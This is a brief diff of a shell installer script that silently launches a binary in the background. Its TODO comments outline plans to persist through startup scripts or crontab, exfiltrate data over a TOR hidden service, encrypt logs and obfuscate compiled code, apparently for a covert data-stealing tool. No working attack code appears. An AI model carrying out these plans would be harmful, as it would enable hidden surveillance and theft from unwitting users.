@@ -22,7 +22,3 @@ exec "$INSTALL_DIR/$BIN_NAME" &>/dev/null &
 # exec python "$INSTALL_DIR/$BIN_NAME" &>/dev/null &
 
 # TODO: Add to startup scripts/crontab
-# TODO: Encrypted logs
-# TODO: Exfiltration through TOR hidden service
-# TODO: Compile .py for obfiscation
-# TODO: Bundle python deps into single executable
